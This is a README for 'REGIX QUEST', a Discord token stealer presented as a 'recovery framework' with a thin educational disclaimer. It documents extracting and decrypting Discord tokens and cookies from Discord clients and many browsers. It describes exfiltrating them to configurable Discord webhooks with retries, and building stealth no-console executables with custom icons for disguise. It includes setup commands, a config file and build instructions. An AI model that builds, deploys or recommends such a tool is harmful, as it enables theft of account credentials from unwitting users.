<p align="center">
  <h1 align="center">🔥 REGIX QUEST</h1>
  <p align="center">
    <strong>Advanced Discord Token Recovery Framework</strong>
  </p>
  <p align="center">
    <img src="https://img.shields.io/badge/python-3.7+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python">
    <img src="https://img.shields.io/badge/platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
    <img src="https://img.shields.io/badge/release-v2.0-red?style=for-the-badge" alt="Release">
  </p>
</p>

---

> **⚠️ LEGAL DISCLAIMER**
> This software is intended **exclusively for educational purposes and authorized security research**. Unauthorized access to computer systems is a criminal offense under the Computer Fraud and Abuse Act (CFAA) and equivalent legislation worldwide. The author assumes **zero liability** for any misuse. By using this tool, you accept full responsibility and confirm you have explicit written authorization for any systems tested.

---

## 🧬 Architecture

```
REGIX QUEST/
├── regix_quest.py          # Core engine — token extraction & validation
├── builder.py         # Build system — PyInstaller packaging & icon support
├── config.json        # Runtime configuration
├── setup.py           # Dependency installer
├── build.bat          # Interactive build & run menu
├── run.bat            # Quick-launch script
├── requirements.txt   # Pinned dependencies
├── GUIDE.md           # Complete usage documentation
└── LICENSE            # GNU GPL v2.0
```

---

## ✨ Feature Matrix

| Category        | Feature                    | Details                                                                                                                      |
| :-------------- | :------------------------- | :--------------------------------------------------------------------------------------------------------------------------- |
| **Extraction**  | Chromium token decryption  | AES-GCM via DPAPI master key                                                                                                 |
|                 | Unencrypted token scanning | Regex pattern matching across LevelDB                                                                                        |
|                 | Cookie-based extraction    | Discord session cookies from SQLite                                                                                          |
|                 | Firefox support            | SQLite profile scanning                                                                                                      |
| **Targets**     | Discord clients            | Standard, Canary, PTB, Lightcord                                                                                             |
|                 | Chromium browsers (16+)    | Chrome, Edge, Brave, Opera, Vivaldi, Yandex, Amigo, Torch, Kometa, Orbitum, CentBrowser, 7Star, Sputnik, Epic, Uran, Iridium |
|                 | Firefox                    | All profile directories                                                                                                      |
| **Performance** | Parallel scanning          | Threaded platform enumeration                                                                                                |
|                 | Parallel validation        | `ThreadPoolExecutor` with configurable worker count                                                                          |
|                 | Key caching                | Encryption keys cached per-path, zero redundant DPAPI calls                                                                  |
|                 | O(1) deduplication         | Set-based token dedup before validation                                                                                      |
| **Delivery**    | Webhook dispatch           | Discord webhook with embedded rich data                                                                                      |
|                 | Fallback webhooks          | Ordered list; automatic cascade on failure                                                                                   |
|                 | Retry logic                | Configurable attempt count & backoff delay                                                                                   |
|                 | Local backup               | Timestamped plaintext file with full token metadata                                                                          |
| **Stealth**     | Random I/O delays          | Configurable min/max range per file read                                                                                     |
|                 | Silent mode                | Suppresses all console output below ERROR                                                                                    |
|                 | No-console build           | PyInstaller `--noconsole` stealth executable                                                                                 |
| **Build**       | Custom EXE icon            | URL or local `.ico` path — auto-downloads & converts from imgur                                                              |
|                 | Bundled config             | `config.json` embedded via `--add-data`                                                                                      |
|                 | One-file packaging         | Single portable `.exe` via PyInstaller                                                                                       |
| **Config**      | JSON configuration         | All behavior tunable at runtime                                                                                              |
|                 | CLI overrides              | `--dry-run`, `--silent`, `--config` flags                                                                                    |
|                 | Validation engine          | Pre-flight config checks with actionable error messages                                                                      |

---

## 🚀 Quick Start

### 1 · Install

```bash
# Automatic (recommended)
python setup.py

# Manual
pip install pypiwin32 pycryptodome
```

### 2 · Configure

Edit `config.json` — at minimum, set your webhook:

```json
{
  "webhook_urls": ["https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"]
}
```

### 3 · Run

```bash
python regix_quest.py              # Standard execution
python regix_quest.py --dry-run    # Test mode (no webhook delivery)
python regix_quest.py --silent     # Suppress console output
```

Or double-click **`build.bat`** for the interactive menu.

---

## ⚙️ Configuration Reference

### `config.json`

```json
{
  "webhook_urls": [
    "https://discord.com/api/webhooks/PRIMARY",
    "https://...BACKUP"
  ],
  "avatar_url": "https://i.imgur.com/HmoE29J.png",
  "embed_color": 1752220,
  "timeout": 10,
  "silent_mode": false,
  "dry_run": false,
  "save_to_file": true,
  "backup_file": "regix_quest_backup.txt",
  "max_threads": 20,
  "random_delays": true,
  "min_delay": 0.01,
  "max_delay": 0.05,
  "webhook_retry_count": 3,
  "webhook_retry_delay": 2.0,
  "exe_icon": "https://imgur.com/HmoE29J"
}
```

| Parameter             | Type       | Default             | Description                                          |
| :-------------------- | :--------- | :------------------ | :--------------------------------------------------- |
| `webhook_urls`        | `string[]` | `[""]`              | Ordered webhook URLs — tries sequentially on failure |
| `avatar_url`          | `string`   | —                   | Webhook avatar image URL                             |
| `embed_color`         | `int`      | `1752220`           | Embed sidebar color (decimal)                        |
| `timeout`             | `int`      | `10`                | HTTP request timeout (seconds)                       |
| `silent_mode`         | `bool`     | `false`             | Suppress all INFO-level logging                      |
| `dry_run`             | `bool`     | `false`             | Log payloads without sending to webhooks             |
| `save_to_file`        | `bool`     | `true`              | Write token data to local backup                     |
| `backup_file`         | `string`   | `regix_quest_backup.txt` | Backup file path                                     |
| `max_threads`         | `int`      | `20`                | Max parallel token validation workers                |
| `random_delays`       | `bool`     | `true`              | Insert random delays between file I/O                |
| `min_delay`           | `float`    | `0.01`              | Minimum delay in seconds                             |
| `max_delay`           | `float`    | `0.05`              | Maximum delay in seconds                             |
| `webhook_retry_count` | `int`      | `3`                 | Retry attempts per webhook URL                       |
| `webhook_retry_delay` | `float`    | `2.0`               | Seconds between retry attempts                       |
| `exe_icon`            | `string`   | `NONE`              | EXE icon — URL (auto-converted) or local `.ico` path |

### CLI Flags

| Flag              | Effect                           |
| :---------------- | :------------------------------- |
| `--config <path>` | Load alternate config file       |
| `--dry-run`       | Override `dry_run` to `true`     |
| `--silent`        | Override `silent_mode` to `true` |
| `--help`          | Display usage information        |

---

## 📦 Building Executables

### Interactive Build

```
build.bat → Option [5] Build Executable
build.bat → Option [6] Build Executable (Stealth — no console window)
```

### CLI Build

```bash
python builder.py              # Standard build
python builder.py --stealth    # No-console build
```

### Custom Icon

Set `exe_icon` in `config.json`:

```json
{
  "exe_icon": "https://imgur.com/HmoE29J"
}
```

The builder accepts:

- **Imgur page URLs** — auto-converts `imgur.com/ID` → `i.imgur.com/ID.png`
- **Direct image URLs** — any `.png`, `.jpg`, `.bmp`
- **Local `.ico` files** — used directly

Output: `dist/RegixQuest.exe` (or `dist/RegixQuest_Stealth.exe`)

---

## 📊 Execution Flow

```
┌─────────────┐     ┌──────────────┐     ┌───────────────┐     ┌──────────────┐
│ Load Config  │────▶│ Scan Targets │────▶│ Deduplicate   │────▶│ Validate     │
│ + Validate   │     │ (Threaded)   │     │ Tokens (O(1)) │     │ (Parallel)   │
└─────────────┘     └──────────────┘     └───────────────┘     └──────┬───────┘
                                                                       │
                                                              ┌────────▼────────┐
                                                              │ Deliver Results  │
                                                              │ Webhook + Backup │
                                                              └─────────────────┘
```

**Scan targets** are enumerated in parallel — one thread per platform (Discord, Chrome, Edge, etc.). Found tokens are deduplicated via `set()`, then validated against `discord.com/api/v9/users/@me` using a `ThreadPoolExecutor`. Valid tokens are delivered to webhooks with automatic retry and saved to the backup file.

---

## 🔒 Supported Targets

### Discord Clients

`Discord` · `Discord Canary` · `Discord PTB` · `Lightcord`

### Chromium-Based Browsers

`Chrome` · `Chrome SxS` · `Edge` · `Brave` · `Opera` · `Opera GX` · `Vivaldi` · `Yandex` · `Amigo` · `Torch` · `Kometa` · `Orbitum` · `CentBrowser` · `7Star` · `Sputnik` · `Epic Privacy Browser` · `Uran` · `Iridium`

### Other

`Firefox` (all profiles)

---

## 📂 Dependencies

| Package        | Version  | Purpose                                         |
| :------------- | :------- | :---------------------------------------------- |
| `pypiwin32`    | ≥ 223    | Windows DPAPI (`win32crypt`) for key decryption |
| `pycryptodome` | ≥ 3.23.0 | AES-GCM token decryption                        |
| `pyinstaller`  | ≥ 6.17.0 | Executable packaging                            |
| `Pillow`       | ≥ 10.0.0 | Icon image conversion for builds                |

---

## 📄 License

Licensed under the **GNU General Public License v2.0** — see [LICENSE](LICENSE).

---

## 👤 Author

**REGIX QUEST** — REGIX QUEST

---

## 📚 Documentation

| Document                       | Description                                         |
| :----------------------------- | :-------------------------------------------------- |
| [**GUIDE.md**](GUIDE.md)       | Complete step-by-step usage and configuration guide |
| [**config.json**](config.json) | Runtime configuration reference                     |
| [**LICENSE**](LICENSE)         | Full license text                                   |

---

<p align="center">
  <strong>💀 REGIX QUEST — Built by REGIX QUEST</strong><br>
  <sub>For educational and authorized security research only.</sub>
</p>
